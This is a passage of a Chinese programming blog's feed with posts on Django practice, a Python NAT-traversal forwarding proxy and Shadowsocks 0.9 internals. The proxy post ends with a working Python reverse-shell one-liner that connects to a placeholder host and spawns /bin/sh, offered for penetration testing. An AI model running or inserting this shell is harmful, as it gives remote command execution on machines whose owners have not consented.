class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.db import connection</span><br><span class="line">connection.queries</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">9. 可以使用 django-debug-toolbar 插件查看慢查询，也能对对哪些页面载入较慢有个大致的了解。</span><br><span class="line"></span><br><span class="line">10. 在 orm 中使用 select_related() 减少查询数据库次数:，select_related() 会自动扩展外键关系</span><br></pre></td></tr></table></figure><p>class Province(models.Model):<br>    name = models.CharField(max_length=10)</p><p>class City(models.Model):<br>    name = models.CharField(max_length=5)<br>    province = models.ForeignKey(Province)</p><p>citys = City.objects.select_related().all()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">不过对于高并发的应用来说外键不是很推荐。</span><br><span class="line"></span><br><span class="line">### forms 模块</span><br><span class="line"></span><br><span class="line">1. 前端传上来一个表单的值，但是没法确认这些值是不是为空，是不是类型正确，这个时候当然可以自己一个个值判断，也可以采用 forms 模块去做验证，用过 django-rest-framework 的同学会知道和里面的 serializers 是同一个概念</span><br></pre></td></tr></table></figure><p>class PersonDetailsForm(forms.Form):<br>       name = forms.CharField(max_length=100)<br>       age = forms.IntegerField()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 如果你用的是模板渲染的方式，那么展示的时候更简单，表单能自动生成 html 的表单。</span><br></pre></td></tr></table></figure></p><blockquote><blockquote><blockquote><p>f = PersonDetailsForm()<br>print(f.as_p())</p><p></p><p><label for="id_name">Name:</label> <input id="id_name" maxlength="100" name="name" type="text"></p><p></p><p></p><p><label for="id_age">Age:</label> <input id="id_age" name="age" type="number"></p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### admin 模块</span><br><span class="line"></span><br><span class="line">1. admin 基本上开箱即用，如果需要定制的话，也能做一些组件的定制，不过这些东西得看文档去详细了解了。</span><br><span class="line"></span><br><span class="line">### commands 模块</span><br><span class="line">1. django 提供了后台脚本模块，可以自己集成 BaseCommand 类去自定义脚本</span><br></pre></td></tr></table></figure><p></p></blockquote></blockquote></blockquote><p>python mannage.py -h<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个命令就能看到所有的 commands 命令</span><br><span class="line"></span><br><span class="line">2. 如果不想用他的模块，又想引入 django 项目的一些模块，可以采用下面的方法解决</span><br></pre></td></tr></table></figure></p><p>os.environ.setdefault(“DJANGO_SETTINGS_MODULE”, “myproject.settings”)<br>django.setup()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### settings 模块</span><br><span class="line"></span><br><span class="line">1. 所有的 settings 默认值都在这里面能找到，https://github.com/django/django/blob/master/django/conf/global_settings.py</span><br><span class="line">2. 上线的时候记得把 DEBUG 改成 False, 然后加上 ALLOWED_HOSTS </span><br><span class="line">3. MEDIA_ROOT， MEDIA_URL， STATIC_ROOT， STATIC_URL 这几个之前经常搞混，其实可以分为两类，MEDIA_ROOT 指的是上传文件的目录，MEDIA_URL 指的是前缀名，http://example.com/media/， 其中的media 就是 MEDIA_URL， 同样，STATIC_ROOT 指的是静态文件的目录，一般放 css, js 之类，STATIC_URL 值得是前缀名，http://example.com/static/。</span><br><span class="line">4. 一般部署上线的时候，用 nginx 直接渲染静态文件</span><br></pre></td></tr></table></figure></p><pre><code>location /media  {    alias /root/example_project/public/media;}location /static {    alias /root/example_project/static;}</code></pre><p>```</p><h3 id="contrib-模块"><a href="#contrib-模块" class="headerlink" title="contrib 模块"></a>contrib 模块</h3><ol><li>这里面的模块是 django 自带的 apps，用的比较多的有 admin, auth, sessions</li><li>admin 模块其实就是 django 的后台</li><li>auth 模块就是用户模块，功能上比较齐全，基本上可以基于这个模块做扩展。</li><li>session 模块结合 auth ，用来做用户的登录状态，对于大型网站来说，session 的存储可能是个问题，django 也提供了不同的 backends，支持 db, cache, file 等存储方式。</li></ol><h3 id="middleware-模块"><a href="#middleware-模块" class="headerlink" title="middleware 模块"></a>middleware 模块</h3><ol><li>django 自带的 middlreware 对于普通网站的需求已经蛮完善了，比如 CsrfMiddleware ， HttpMiddleware。</li><li>如果有自己的需求，也可以自定义，比如记录详细 log 信息，LogMiddleware，还有跨域的 CorsMiddleware。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol><li>网上有人说 django 只能做小网站，不支持大的并发，其实这个说法还是很片面的。django 自身只是一个框架，如果网站请求处理慢，很多情况下是自己写的逻辑没有优化。确认是 django 框架问题的话，django 虽然设计上略复杂，但是很多模块还是可以拆分去自定义的。最后实在不济，靠增加机器数量也能顶一阵。</li><li>django 的国际化模块做的很不错</li><li>setting 文件可分成 product, 和 dev 两份，根据开发环境和生产环境不同引入不同的 setting 文件。</li><li>django-celery 用来执行异步任务</li><li>django 的插件非常多，<a href="https://github.com/rosarior/awesome-django" target="_blank" rel="noopener">https://github.com/rosarior/awesome-django</a></li><li>其他想到的再更新。。。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python 的 web 框架非常多，比较出名的有 django, flask, tornado。django 作为一个老牌框架，无论是文档还是代码质量都非常高，另外他自带的 admin 后台和一些有用的 app，如果你的需求是做 cms 之类的 web 应用的话，基本上不用开发多少代码就能出一个成品。不过很多新手可能一开始不太适应他的设计模式，遇到问题后基本就懵了，所以这里我按照自己用 django 的经验，写一下 django 的一些应用实践，可能写的比较零散，大家见谅。&lt;/p&gt;
&lt;h3 id=&quot;整体流程&quot;&gt;&lt;a href=&quot;#整体流程&quot; class=&quot;headerlink&quot; title=&quot;整体流程&quot;&gt;&lt;/a&gt;整体流程&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/15077390149599.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web, django" scheme="http://yousite.com/tags/web-django/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(10)-内网穿透</title>
    <link href="http://yousite.com/2017/08/26/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-10-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <id>http://yousite.com/2017/08/26/由浅入深写代理-10-反向代理/</id>
    <published>2017-08-26T06:27:04.000Z</published>
    <updated>2018-01-27T14:47:34.395Z</updated>
    
    <content type="html"><![CDATA[<p>本篇主要介绍代理的一个常用的功能：内网穿透<br>很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。</p><p>有专门的软件做这件事，如 ngrok, frp。<br><a id="more"></a><br>介绍下原理<br>由于内网的机器有 NAT 或 防火墙什么的，外网 vps 是无法会直接连接的，所以想要通过 vps 来中转就需要内网先连接 vps，然后 vps 通过连接的套接字来转发数据。</p><p>贴下代码</p><p>client_proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line">def send_data(sock, data):</span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = 0</span><br><span class="line">    while True:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        if r &lt; 0:</span><br><span class="line">            return r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        if bytes_sent == len(data):</span><br><span class="line">            return bytes_sent</span><br><span class="line"></span><br><span class="line">def handle_tcp(sock, remote):</span><br><span class="line">    # 处理 client socket 和 remote socket 的数据流</span><br><span class="line">    try:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                data = sock.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">            if remote in r:</span><br><span class="line">                data = remote.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise(e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    s_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s_conn.connect((&quot;xx.xx.xx.xx&quot;, 2333))</span><br><span class="line"></span><br><span class="line">    client_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    client_conn.connect((&apos;127.0.0.1&apos;, 8000))</span><br><span class="line"></span><br><span class="line">    handle_tcp(s_conn, client_conn)</span><br></pre></td></tr></table></figure><p>server_proxy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">import threading</span><br><span class="line">import socket</span><br><span class="line">import select</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span><br><span class="line">s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line"></span><br><span class="line"># 将套接字绑定到地址</span><br><span class="line">s1.bind((&apos;&apos;, 2333))</span><br><span class="line"># 监听TCP传入连接</span><br><span class="line">s1.listen(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># AF_INET: 基于 IPV4 的网络通信 SOCK_STREAM: 基于 TCP 的流式 socket 通信</span><br><span class="line">s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line"># 将套接字绑定到地址</span><br><span class="line">s2.bind((&apos;&apos;, 8000))</span><br><span class="line"># 监听TCP传入连接</span><br><span class="line">s2.listen(5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_data(sock, data):</span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = 0</span><br><span class="line">    while True:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        if r &lt; 0:</span><br><span class="line">            return r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        if bytes_sent == len(data):</span><br><span class="line">            return bytes_sent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def handle_tcp(sock, remote):</span><br><span class="line">    # 处理 client socket 和 remote socket 的数据流</span><br><span class="line">    try:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        while True:</span><br><span class="line">            # 用 IO 多路复用 select 监听套接字是否有数据流</span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            if sock in r:</span><br><span class="line">                data = sock.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">            if remote in r:</span><br><span class="line">                data = remote.recv(4096)</span><br><span class="line">                if len(data) &lt;= 0:</span><br><span class="line">                    break</span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                if result &lt; len(data):</span><br><span class="line">                    raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise(e)</span><br><span class="line">    finally:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    con1, addr1 = s1.accept()</span><br><span class="line">    print(&quot;new connection from %s:%s&quot; % addr1)</span><br><span class="line">    con2, addr2 = s2.accept()</span><br><span class="line">    print(&quot;new connection from %s:%s&quot; % addr2)</span><br><span class="line">    t = threading.Thread(target=handle_tcp, args=(con1, con2))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><ol><li>假设我们需要共享的 web 是 python 的 simple http_server， 首先执行 python -m SimpleHTTPServer, 这样本地会绑定 8000 端口</li><li>在自己的 vps 上运行 python3 reverse_server.py</li><li>在本地运行 python3 reverse_client_proxy.py</li><li>接下来我们直接在外网访问 vps 的地址: <a href="http://xx.xx.xx.xx:8000" target="_blank" rel="noopener">http://xx.xx.xx.xx:8000</a> 就可以发现能够转发内网的数据了。</li></ol><p><img src="/media/15037300977077.jpg" alt=""></p><p>github 地址: <a href="https://github.com/facert/socket-example/blob/master/reverse_client_proxy.py" target="_blank" rel="noopener">reverse_client_proxy.py</a></p><p><a href="https://github.com/facert/socket-example/blob/master/reverse_server_proxy.py" target="_blank" rel="noopener">reverse_server_proxy</a></p><p>一般内网穿透在网络安全人员做内网渗透测试的时候比较有用，反弹一个 shell。就可以任意执行命令。</p><p>这里分享一个最基本的 python 反弹 shell 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">2333</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本篇主要介绍代理的一个常用的功能：内网穿透&lt;br&gt;很多人经常会有这么一个需求，需要将本地开发的 web 项目给外网的人看下，再搭一遍到 vps 太麻烦，于是就有借助拥有公网 ip 的主机来中转。&lt;/p&gt;
&lt;p&gt;有专门的软件做这件事，如 ngrok, frp。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(8)-ss-代理.md</title>
    <link href="http://yousite.com/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-8-shadowsocks-%E4%BB%A3%E7%90%86-md/"/>
    <id>http://yousite.com/2017/08/20/由浅入深写代理-8-shadowsocks-代理-md/</id>
    <published>2017-08-20T11:20:39.000Z</published>
    <updated>2018-01-27T14:47:46.184Z</updated>
    
    <content type="html"><![CDATA[<p>ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。<br><a id="more"></a><br>首先上图</p><p><img src="/media/15032288280119.jpg" alt=""></p><p>client 和 ss_local 主要通过 socks5 协议通信，而 ss_local 和 ss_server 之间就是对称加密的 tcp 数据。</p><p>ss_local 主要代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">class Socks5Server(SocketServer.StreamRequestHandler):</span><br><span class="line">    &apos;&apos;&apos; RequesHandlerClass Definition &apos;&apos;&apos;</span><br><span class="line">    def handle_tcp(self, sock, remote):</span><br><span class="line">        try:</span><br><span class="line">            fdset = [sock, remote]</span><br><span class="line">            while True:</span><br><span class="line">                r, w, e = select.select(fdset, [], [])      # use select I/O multiplexing model</span><br><span class="line">                if sock in r:                               # if local socket is ready for reading</span><br><span class="line">                    data = sock.recv(4096)</span><br><span class="line">                    if len(data) &lt;= 0:                      # received all data</span><br><span class="line">                        break</span><br><span class="line">                    result = send_all(remote, self.encrypt(data))   # send data after encrypting</span><br><span class="line">                    if result &lt; len(data):</span><br><span class="line">                        raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line"></span><br><span class="line">                if remote in r:                             # remote socket(proxy) ready for reading</span><br><span class="line">                    data = remote.recv(4096)</span><br><span class="line">                    if len(data) &lt;= 0:</span><br><span class="line">                        break</span><br><span class="line">                    result = send_all(sock, self.decrypt(data))     # send to local socket(application)</span><br><span class="line">                    if result &lt; len(data):</span><br><span class="line">                        raise Exception(&apos;failed to send all data&apos;)</span><br><span class="line">        finally:</span><br><span class="line">            sock.close()</span><br><span class="line">            remote.close()</span><br><span class="line"></span><br><span class="line">    def encrypt(self, data):</span><br><span class="line">        return data.translate(encrypt_table)</span><br><span class="line"></span><br><span class="line">    def decrypt(self, data):</span><br><span class="line">        return data.translate(decrypt_table)</span><br><span class="line"></span><br><span class="line">    def send_encrypt(self, sock, data):</span><br><span class="line">        sock.send(self.encrypt(data))</span><br><span class="line"></span><br><span class="line">    def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            sock = self.connection        # local socket [127.1:port]</span><br><span class="line">            sock.recv(262)                # Sock5 Verification packet</span><br><span class="line">            sock.send(&quot;\x05\x00&quot;)         # Sock5 Response: &apos;0x05&apos; Version 5; &apos;0x00&apos; NO AUTHENTICATION REQUIRED</span><br><span class="line">            # After Authentication negotiation</span><br><span class="line">            data = self.rfile.read(4)     # Forward request format: VER CMD RSV ATYP (4 bytes)</span><br><span class="line">            mode = ord(data[1])           # CMD == 0x01 (connect)</span><br><span class="line">            if mode != 1:</span><br><span class="line">                logging.warn(&apos;mode != 1&apos;)</span><br><span class="line">                return</span><br><span class="line">            addrtype = ord(data[3])       # indicate destination address type</span><br><span class="line">            addr_to_send = data[3]</span><br><span class="line">            if addrtype == 1:             # IPv4</span><br><span class="line">                addr_ip = self.rfile.read(4)            # 4 bytes IPv4 address (big endian)</span><br><span class="line">                addr = socket.inet_ntoa(addr_ip)</span><br><span class="line">                addr_to_send += addr_ip</span><br><span class="line">            elif addrtype == 3:           # FQDN (Fully Qualified Domain Name)</span><br><span class="line">                addr_len = self.rfile.read(1)           # Domain name&apos;s Length</span><br><span class="line">                addr = self.rfile.read(ord(addr_len))   # Followed by domain name(e.g. www.google.com)</span><br><span class="line">                addr_to_send += addr_len + addr</span><br><span class="line">            else:</span><br><span class="line">                logging.warn(&apos;addr_type not support&apos;)</span><br><span class="line">                # not support</span><br><span class="line">                return</span><br><span class="line">            addr_port = self.rfile.read(2)</span><br><span class="line">            addr_to_send += addr_port                   # addr_to_send = ATYP + [Length] + dst addr/domain name + port</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, addr_port)       # prase the big endian port number. Note: The result is a tuple even if it contains exactly one item.</span><br><span class="line">            try:</span><br><span class="line">                reply = &quot;\x05\x00\x00\x01&quot;              # VER REP RSV ATYP</span><br><span class="line">                reply += socket.inet_aton(&apos;0.0.0.0&apos;) + struct.pack(&quot;&gt;H&quot;, 2222)  # listening on 2222 on all addresses of the machine, including the loopback(127.0.0.1)</span><br><span class="line">                self.wfile.write(reply)                 # response packet</span><br><span class="line">                # reply immediately</span><br><span class="line">                if &apos;-6&apos; in sys.argv[1:]:                # IPv6 support</span><br><span class="line">                    remote = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)</span><br><span class="line">                else:</span><br><span class="line">                    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)       # turn off Nagling</span><br><span class="line">                remote.connect((SERVER, REMOTE_PORT))</span><br><span class="line">                self.send_encrypt(remote, addr_to_send)      # encrypted</span><br><span class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</span><br><span class="line">            except socket.error, e:</span><br><span class="line">                logging.warn(e)</span><br><span class="line">                return</span><br><span class="line">            self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error, e:</span><br><span class="line">            logging.warn(e)</span><br></pre></td></tr></table></figure><p>其中和 socks5 交互的部分 <code>handle</code> 在前面 socks5 教程已经讲过，唯一的区别是 <code>send_encrypt</code> 函数，每次 send 的时候都会 encrypt 一次，拿到数据后再 decrypt 一次。</p><p>ss_server 的代码也和 local 差不多，少了和 socks5 打交道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">def handle(self):</span><br><span class="line">        try:</span><br><span class="line">            sock = self.connection</span><br><span class="line">            addrtype = ord(self.decrypt(sock.recv(1)))      # receive addr type</span><br><span class="line">            if addrtype == 1:</span><br><span class="line">                addr = socket.inet_ntoa(self.decrypt(self.rfile.read(4)))   # get dst addr</span><br><span class="line">            elif addrtype == 3:</span><br><span class="line">                addr = self.decrypt(</span><br><span class="line">                    self.rfile.read(ord(self.decrypt(sock.recv(1)))))       # read 1 byte of len, then get &apos;len&apos; bytes name</span><br><span class="line">            else:</span><br><span class="line">                # not support</span><br><span class="line">                logging.warn(&apos;addr_type not support&apos;)</span><br><span class="line">                return</span><br><span class="line">            port = struct.unpack(&apos;&gt;H&apos;, self.decrypt(self.rfile.read(2)))    # get dst port into small endian</span><br><span class="line">            try:</span><br><span class="line">                logging.info(&apos;connecting %s:%d&apos; % (addr, port[0]))</span><br><span class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                remote.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</span><br><span class="line">                remote.connect((addr, port[0]))         # connect to dst</span><br><span class="line">            except socket.error, e:</span><br><span class="line">                # Connection refused</span><br><span class="line">                logging.warn(e)</span><br><span class="line">                return</span><br><span class="line">            self.handle_tcp(sock, remote)</span><br><span class="line">        except socket.error, e:</span><br><span class="line">            logging.warn(e)</span><br></pre></td></tr></table></figure><p>所以本质上 ss 很简单，就是做了流量的转发，只不过为了避免流量被检测，加密并且还有混淆的功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ss 作用是科学上网，因为怕关键词会让文章被干掉，所以用了别名。本文纯粹是分析技术的角度出发。因为 ss 现在的版本已经很复杂了，eventloop, 状态机，支持 udp 。为了简单讲原理，我们用 0.9 的版本来说明。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(9)-ssh-代理.md</title>
    <link href="http://yousite.com/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-9-ssh-%E4%BB%A3%E7%90%86-md/"/>
    <id>http://yousite.com/2017/08/20/由浅入深写代理-9-ssh-代理-md/</id>
    <published>2017-08-20T10:07:41.000Z</published>
    <updated>2018-01-27T14:47:38.688Z</updated>
    
